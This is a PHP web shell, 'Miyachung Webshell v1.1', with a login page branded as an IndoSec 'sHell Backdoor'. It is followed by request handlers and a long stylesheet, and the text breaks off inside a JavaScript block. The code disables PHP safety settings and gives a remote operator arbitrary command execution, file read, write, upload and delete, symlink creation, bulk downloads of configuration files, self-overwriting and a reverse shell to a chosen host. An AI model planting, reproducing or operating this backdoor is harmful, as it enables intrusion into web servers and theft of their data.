<?php
/*
    * Miyachung Webshell v1.1
    * PHP & Javascript based web shell
    * Authored : miyachung

     DISCLAIMER

     - This script has few of abilities on a web server,some of them might be harmful
       If you are decided to use this script,you have to know that script's author does not takes any responsibility on any harmful use
*/
@session_start();
@ob_start();
@ini_set('max_execution_time', 0);
@ini_set('safe_mode', 'Off');
@ini_set('disable_functions', ' ');
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);

$aupas = '43a0a57e980333b851a05d1afc99eccd';
function login_shell()
{
?>
    <!DOCTYPE html>
    <html>

    <head>
        <meta name="viewport" content="widht=device-widht, initial-scale=1.0" />
        <meta name="theme-color" content="#343a40" />
        <meta name="author" content="Holiq" />
        <meta name="copyright" content="{ IndoSec }" />
        <title>{ IndoSec sHell }</title>
        <link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/indosec.png" />
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css" />
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" />
    </head>

    <body class="bg-dark text-center text-light">
        <div class="container text-center mt-3">
            <h1>{ INDOSEC }</h1>
            <h5>sHell Backdoor</h5>
            <hr />
            <p class="mt-3 font-weight-bold"><i class="fa fa-terminal"></i> Please Login</p>
            <form method="post">
                <div class="form-group input-group">
                    <div class="input-group-prepend">
                        <div class="input-group-text"><i class="fa fa-user"></i></div>
                    </div>
                    <input type="password" name="pass" placeholder="User Id..." class="form-control">
                </div>
                <input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
            </form>
        </div>
        <a href="https://facebook.com/IndoSecOfficial" class="text-muted fixed-bottom mb-3">Copyright 2019 @ { IndoSec }</a>
    </body>

    </html>
<?php
    exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $aupas)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        header("Refresh:0");
    } else {
        login_shell();
    }
}




$helpers = new helpers;

if ($_POST) {
    header("Content-type: application/json");

    if (isset($_POST['list_dir'])) {

        $list = $helpers->list_dir(base64_decode($_POST['list_dir']));

        if ($list === false) {
            $output['status'] = 'no_dir';
            exit(json_encode($output));
        }
        exit(json_encode($list));
    } elseif (isset($_POST['remove_file'])) {

        $remove = $helpers->remove_file(base64_decode($_POST['remove_file']));

        if ($remove) {
            $output['status'] = 'removed';
        } else {
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    } elseif (isset($_POST['chmod_target']) && isset($_POST['chmod'])) {

        $setchmod = $helpers->set_chmod(base64_decode($_POST['chmod_target']), base64_decode($_POST['chmod']));

        if ($setchmod) {
            $output['status'] = 'ok';
        } else {
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    } elseif (isset($_POST['rename_target']) && isset($_POST['new_name']) && isset($_POST['old_name'])) {
        $rename = $helpers->rename(base64_decode($_POST['rename_target']), $_POST['new_name'], $_POST['old_name']);

        if ($rename) {
            $output['status'] = 'ok';
        } else {
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    } elseif (isset($_POST['read_file'])) {
        if (is_file(base64_decode($_POST['read_file']))) {
            $pathinfo  = pathinfo(base64_decode($_POST['read_file']));

            if (stristr($pathinfo['extension'], 'zip') || stristr($pathinfo['extension'], 'rar') || stristr($pathinfo['extension'], 'tar') || stristr($pathinfo['extension'], 'tar.gz') || stristr($pathinfo['extension'], '7z')) {
                $output['status'] = 'failed';
                exit(json_encode($output));
            } elseif (stristr($pathinfo['extension'], 'm4a') || stristr($pathinfo['extension'], 'flac') || stristr($pathinfo['extension'], 'mp3') || stristr($pathinfo['extension'], 'wav') || stristr($pathinfo['extension'], 'aac') || stristr($pathinfo['extension'], 'wma')) {
                $output['audio'] = base64_decode($_POST['read_file']);
                $output['type']  = $helpers->getMimeType(base64_decode($_POST['read_file']));
                exit(json_encode($output));
            } elseif (stristr($pathinfo['extension'], 'mp4') || stristr($pathinfo['extension'], 'avi') || stristr($pathinfo['extension'], 'mov') || stristr($pathinfo['extension'], 'wmv') || stristr($pathinfo['extension'], 'flv') || stristr($pathinfo['extension'], 'avchd') || stristr($pathinfo['extension'], 'mkv') || stristr($pathinfo['extension'], '3gp')) {
                $output['video'] = base64_decode($_POST['read_file']);
                $output['type'] = $helpers->getMimeType(base64_decode($_POST['read_file']));
                exit(json_encode($output));
            }

            $read_file  = @file_get_contents(base64_decode($_POST['read_file']));

            if ($read_file !== false) {
                if (stristr($pathinfo['extension'], 'jpg') || stristr($pathinfo['extension'], 'ico') || stristr($pathinfo['extension'], 'png') || stristr($pathinfo['extension'], 'bmp') || stristr($pathinfo['extension'], 'gif') || stristr($pathinfo['extension'], 'jpeg') || stristr($pathinfo['extension'], 'webp') || stristr($pathinfo['extension'], 'svg')) {
                    $output['data_url'] = 'data: ' . $helpers->getMimeType(base64_decode($_POST['read_file'])) . ';base64,' . base64_encode($read_file);
                }

                $output['content'] = base64_encode($read_file);
            } else {
                $output['status'] = 'failed';
            }
        } else {
            $output['status'] = 'failed';
        }

        exit(json_encode($output));
    } elseif (isset($_POST['edit_file'])) {
        if (isset($_POST['rename'])) {
            if (@rename(base64_decode($_POST['edit_file']), base64_decode($_POST['rename']))) {
                if (isset($_POST['content'])) {
                    if (@file_put_contents(base64_decode($_POST['rename']), base64_decode($_POST['content']), LOCK_EX)) {
                        $output['status']  = @basename(base64_decode($_POST['rename']));
                        $output['old_name'] = @basename(base64_decode($_POST['edit_file']));
                    } else {
                        $output['status']  = @basename(base64_decode($_POST['rename']));
                        $output['old_name'] = @basename(base64_decode($_POST['edit_file']));
                    }
                } else {
                    $output['status']  = @basename(base64_decode($_POST['rename']));
                    $output['old_name'] = @basename(base64_decode($_POST['edit_file']));
                }
            } else {
                $output['status'] = 'failed';
            }
        } else {
            if (isset($_POST['content'])) {
                if (@file_put_contents(base64_decode($_POST['edit_file']), base64_decode($_POST['content']), LOCK_EX)) {
                    $output['status'] = 'ok';
                } else {
                    $output['status'] = 'failed';
                }
            }
        }

        exit(json_encode($output));
    } elseif (isset($_POST['create_file']) && isset($_POST['directory'])) {
        if (!@file_exists(base64_decode($_POST['directory']) . '/' . base64_decode($_POST['create_file'])) || !@is_dir(base64_decode($_POST['directory']) . '/' . base64_decode($_POST['create_file']))) {
            if (@touch(base64_decode($_POST['directory']) . '/' . base64_decode($_POST['create_file']))) {
                $output['status'] = 'ok';
            } else {
                $output['status'] = 'failed';
            }
        } else {
            $output['status'] = 'already_exists';
        }

        exit(json_encode($output));
    } elseif (isset($_POST['create_dir']) && isset($_POST['directory'])) {
        if (!@file_exists(base64_decode($_POST['directory']) . '/' . base64_decode($_POST['create_dir'])) || !@is_dir(base64_decode($_POST['directory']) . '/' . base64_decode($_POST['create_dir']))) {
            if (@mkdir(base64_decode($_POST['directory']) . '/' . base64_decode($_POST['create_dir']))) {
                $output['status'] = 'ok';
            } else {
                $output['status'] = 'failed';
            }
        } else {
            $output['status'] = 'already_exists';
        }
        exit(json_encode($output));
    } elseif (isset($_FILES['files']) && isset($_POST['directory'])) {

        foreach ($_FILES['files']['name'] as $key => $name) {
            $upload = $helpers->file_upload($_FILES['files']['tmp_name'][$key], $name, base64_decode($_POST['directory']));

            if ($upload) {
                $output['status'] = 'ok';
            } else {
                $output['status'] = 'failed';
            }
        }
        exit(json_encode($output));
    } elseif (isset($_POST['command']) && isset($_POST['directory'])) {

        $cmd = $helpers->run_cmd(base64_decode($_POST['command']), base64_decode($_POST['directory']));

        if ($cmd) {
            $output['status'] = base64_encode($cmd);
        } else {
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    } elseif (isset($_POST['symlink_target'])) {
        $symlink = $helpers->create_symlink(base64_decode($_POST['symlink_target']));

        if ($symlink) {
            $output['status'] = base64_encode(htmlentities($symlink));
        } else {
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    } elseif (isset($_POST['search_location']) && isset($_POST['search_keyword']) && isset($_POST['search_type'])) {

        $command = $helpers->run_cmd($helpers->prepare_search_cmd($_POST['search_location'], $_POST['search_keyword'], $_POST['search_type']));

        if ($command) {
            $output['status'] = base64_encode($command);
        } else {
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    } elseif (isset($_POST['download_cfg'])) {
        $zipAll = $helpers->download_configs(base64_decode($_POST['download_cfg']));

        if ($zipAll == false) {
            $output['status'] = 'failed';
        } else {
            $output['url'] = $zipAll;
        }
        exit(json_encode($output));
    } elseif (isset($_POST['update_content'])) {

        if (@file_put_contents(basename($_SERVER['PHP_SELF']), base64_decode($_POST['update_content']))) {
            $output['status'] = 'ok';
        } else {
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    } elseif (isset($_POST['getip'])) {

        $client_ip = $helpers->getClientIP();

        if ($client_ip) {
            $output['status'] = $client_ip;
        } else {
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    } elseif (isset($_POST['rev_ip']) && isset($_POST['rev_port']) && isset($_POST['method'])) {

        $create_shell = $helpers->reverse_shell($_POST['rev_ip'], $_POST['rev_port'], $_POST['method']);

        if ($create_shell) {
            $output['status'] = 'ok';
        } else {
            $output['status'] = 'failed';
        }
        exit(json_encode($output));
    }

    exit;
}
if (isset($_GET['download_file'])) {

    $file     = base64_decode($_GET['download_file']);

    $download = $helpers->download_file($file);

    if ($download === false) {
        print '<script>window.history.back();</script>;';
    }
    exit;
} elseif (isset($_GET['adminer'])) {

    $adminer = $helpers->get_adminer();
    if ($adminer) {
        $output['status'] = 'ok';
    } else {
        $output['status'] = 'failed';
    }

    exit(json_encode($output));
} elseif (isset($_GET['cgitelnet'])) {
    $cgitelnet = $helpers->get_cgitelnet();

    if ($cgitelnet) {
        $output['status'] = 'ok';
    } else {
        $output['status'] = 'failed';
    }

    exit(json_encode($output));
} elseif (isset($_GET['play_audio'])) {
    $audioPath = $_GET['play_audio'];
    header('Cache-Control: no-cache');
    header('Content-Transfer-Encoding: binary');
    header('Content-Type: audio/mp3');
    header('Content-Length: ' . filesize($audioPath));
    header('Accept-Ranges: bytes');

    readfile($audioPath);

    exit;
} elseif (isset($_GET['play_video'])) {
    $videoPath = $_GET['play_video'];
    header('Cache-Control: no-cache');
    header('Content-Transfer-Encoding: binary');
    header('Content-Type: video/mp4');
    header('Content-Length: ' . filesize($videoPath));
    header('Accept-Ranges: bytes');

    readfile($videoPath);
    exit;
} elseif (isset($_GET['download_folder'])) {
    if (is_dir(base64_decode($_GET['download_folder']))) {
        $zip_folder = $helpers->download_as_zip(base64_decode($_GET['download_folder']));

        if ($zip_folder == false) {
            exit;
        } else {
            $download_folder = $helpers->download_file($zip_folder, true);

            if ($download_folder == false) {
                exit;
            }
            exit;
        }
    } else {
        exit;
    }

    exit;
} elseif (isset($_GET['download_cfg_file'])) {

    $download_cfg = $helpers->download_file(base64_decode($_GET['download_cfg_file']), true);

    if ($download_cfg == false) {
        exit;
    }
    exit;
}
if (!function_exists('posix_getgrgid')) {

    function posix_getgrgid($gid)
    {
        return false;
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style type="text/css">
        @import url(https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta2/css/all.min.css);

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Sagoe UI", sans-serif;
            outline: 0;
            list-style: none;
            text-decoration: none;
            color: #fff;
            -webkit-font-smoothing: antialiased
        }

        body,
        html {
            height: 100%
        }

        body {
            background: #222831;
            display: flex;
            justify-content: center
        }

        .holder {
            margin-top: 15px;
            width: 85%;
            min-width: 450px;
            overflow-x: hidden
        }

        .holder::-webkit-scrollbar {
            width: 7px
        }

        .holder::-webkit-scrollbar-track {
            background-color: #e4e4e4;
            border-radius: 50px
        }

        .holder::-webkit-scrollbar-thumb {
            background-color: #222831;
            border-radius: 50px
        }

        .mwsbox {
            overflow-x: hidden;
            background: #3a4a63;
            padding: 10px 15px;
            border-radius: 10px;
            box-shadow: -20px 30px 30px -20px rgba(0, 0, 0, .8);
            position: relative;
            width: 100%
        }

        .mwsbox .bottom-menu {
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, .75);
            z-index: 999;
            border-radius: 10px 10px 0 0
        }

        .mwsbox .bottom-menu ul {
            display: flex
        }

        .mwsbox .bottom-menu ul li {
            padding: 10px 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 5px;
            transition: 350ms all
        }

        .mwsbox .bottom-menu ul li span {
            display: none;
            font-weight: 700
        }

        .mwsbox .bottom-menu ul li:hover {
            background: rgba(255, 255, 255, .5)
        }

        .mwsbox .bottom-menu ul li:hover>span {
            display: block;
            margin-left: 5px
        }

        .mwsbox .title {
            width: 100%;
            padding-bottom: 7px;
            border-bottom: 2px solid rgba(255, 255, 255, .15);
            margin-bottom: 7px;
            flex-wrap: wrap
        }

        .mwsbox .title ul {
            display: flex;
            flex-direction: column
        }

        .mwsbox .title ul li span {
            font-weight: 700;
            color: #fff;
            font-size: 16px;
            white-space: nowrap;
            margin-right: 5px
        }

        .mwsbox .title ul li {
            display: flex;
            align-items: center;
            font-size: 15px;
            color: rgba(255, 255, 255, .95)
        }

        .mwsbox .title ul li p {
            word-break: break-all
        }

        .mwsbox .title h3 {
            width: 100%;
            background: rgba(34, 40, 49, .2);
            text-align: center;
            margin-bottom: 5px;
            font-size: 32px;
            letter-spacing: 3px;
            font-weight: 600;
            font-weight: 500;
            color: #fff;
            border-radius: 5px;
            padding: 5px 0;
            font-family: "trebuchet ms";
            text-transform: uppercase
        }

        .mwsbox .inner {
            width: 100%;
            padding: 0 10px 5px 0;
            overflow: auto;
            max-height: 460px;
            height: 460px;
        }

        .mwsbox .inner::-webkit-scrollbar {
            width: 7px
        }

        .mwsbox .inner::-webkit-scrollbar-track {
            background-color: #e4e4e4;
            border-radius: 50px
        }

        .mwsbox .inner::-webkit-scrollbar-thumb {
            background-color: #222831;
            border-radius: 50px
        }

        .mwsbox .inner table {
            width: 100%;
            display: none
        }

        .mwsbox .inner table thead tr th {
            border-bottom: 1px solid rgba(255, 255, 255, .08);
            text-align: right;
            padding-bottom: 10px;
            font-size: 15px;
            font-weight: 600
        }

        .mwsbox .inner table tbody tr td {
            padding: 8px 0;
            border-bottom: 1px solid rgba(255, 255, 255, .02);
            font-size: 14px;
            font-weight: 600;
            text-align: right
        }

        .mwsbox .inner table tbody tr td i {
            font-size: 17px
        }

        .mwsbox .inner table tbody tr td:hover span {
            text-decoration: underline
        }

        .mwsbox .inner table tbody tr td span {
            cursor: pointer
        }

        .mwsbox .inner table tbody tr:last-child td {
            border-bottom: none
        }

        .mwsbox .inner table tbody tr td .icons {
            display: flex;
            align-items: center;
            text-align: right;
            justify-content: flex-end
        }

        .mwsbox .inner table tbody tr td .icons i {
            padding: 0 5px;
            cursor: pointer;
            display: block
        }

        .mwsbox .inner .loaderhold {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center
        }

        .mwsbox .inner .loaderhold .loader {
            margin-top: 20px;
            display: none;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #555;
            border-radius: 50%;
            width: 100px;
            height: 100px;
            animation: spin 1.5s linear infinite
        }

        .mwsbox .process-screen {
            width: calc(75% - 200px);
            position: absolute;
            min-width: 350px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 10px 35px 35px -30px rgba(0, 0, 0, .8);
            padding: 25px;
            z-index: 9999;
            top: -50%;
            left: 50%;
            transform: translate(-50%, -50%);
            visibility: hidden;
            max-height: 700px;
            overflow: auto;
            transition: .2s all;
            opacity: 0
        }

        .mwsbox .process-screen::-webkit-scrollbar {
            width: 8px
        }

        .mwsbox .process-screen::-webkit-scrollbar-track {
            background-color: #e4e4e4;
            border-radius: 50px
        }

        .mwsbox .process-screen::-webkit-scrollbar-thumb {
            background-color: gray;
            border-radius: 50px
        }

        .mwsbox .process-screen h3 {
            color: #222;
            font-size: 16px;
            padding-bottom: 5px;
            border-bottom: 1px solid #ccc;
            margin-bottom: 10px
        }

        .mwsbox .process-screen form {
            display: flex;
            flex-direction: column
        }

        .mwsbox .process-screen input[type=text] {
            width: 100%;
            height: 45px;
            padding-left: 10px;
            border: 1px solid #aaa;
            color: #333;
            background: #ccc
        }

        .mwsbox .process-screen input[type=text]:hover {
            border: 1px solid #000
        }

        .mwsbox .process-screen input::placeholder {
            color: gray
        }

        .mwsbox .process-screen textarea {
            width: 100%;
            height: 250px;
            resize: none;
            padding: 5px;
            border: 1px solid #aaa;
            color: #333;
            background: #ccc
        }

        .mwsbox .process-screen textarea:hover {
            border: 1px solid #000
        }

        .mwsbox .process-screen button {
            width: 200px;
            height: 45px;
            padding: 10px;
            background: #0b8ad9;
            color: #fff;
            border: none;
            font-weight: 700;
            text-transform: uppercase;
            font-size: 16px;
            margin-top: 10px;
            cursor: pointer;
            transition: 250ms all
        }

        .mwsbox .process-screen button:hover {
            background: #0078c2
        }

        .mwsbox .process-screen label {
            color: #222;
            font-weight: 600;
            margin-bottom: 5px
        }

        .mwsbox .process-screen select {
            width: 100%;
            height: 45px;
            border: 1px solid #aaa;
            padding-left: 10px;
            color: rgba(0, 0, 0, .5);
            background: #ccc
        }

        .mwsbox .process-screen select option {
            color: rgba(0, 0, 0, .5)
        }

        .mwsbox .process-screen .cmd_result {
            word-break: break-all;
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            background: #222;
            border: 1px solid rgba(255, 255, 255, .8);
            margin-bottom: 10px;
            color: #fff;
            font-weight: 700;
            font-size: 14px;
            max-height: 250px;
            overflow: auto
        }

        .mwsbox .process-screen .cmd_result::-webkit-scrollbar {
            width: 8px
        }

        .mwsbox .process-screen .cmd_result::-webkit-scrollbar-track {
            background-color: #e4e4e4;
            border-radius: 50px
        }

        .mwsbox .process-screen .cmd_result::-webkit-scrollbar-thumb {
            background-color: gray;
            border-radius: 50px
        }

        .mwsbox .popup-box {
            position: absolute;
            width: 300px;
            min-width: 250px;
            border-radius: 5px;
            padding: 10px;
            font-size: 14px;
            font-weight: 700;
            box-shadow: 15px 12px 20px -15px rgba(0, 0, 0, .9);
            color: #fff;
            transition: 250ms all;
            right: -9999px;
            top: 10%;
            opacity: 0;
            visibility: hidden;
            z-index: 50
        }

        #path strong {
            padding-left: 2px
        }

        #path strong:hover {
            text-decoration: underline
        }

        .popup-box.alert {
            background: #bd0404
        }

        .popup-box.success {
            background: #029c11
        }

        @media only screen and (max-height:900px) {
            .mwsbox {
                height: 800px;
                width: 100%;
                overflow-x: hidden;
            }

            .bottom-menu {
                top: 0;
                max-height: 50px;
                transform: none
            }

            .holder {
                width: 100%
            }
        }

        @media only screen and (max-width:450px) {
            .holder {
                width: 100%;
                height: 100%;
                overflow-x: hidden;
            }

            .bottom-menu {
                top: 0;
                max-height: 50px;
                transform: none
            }
        }

        @keyframes spin {
            0% {
                transform: rotate(0)
            }

            100% {
                transform: rotate(360deg)
            }
        }
    </style>
    <script>
        let working_dir, release = "1.1",
            perl_icon = "data:image/png;base64,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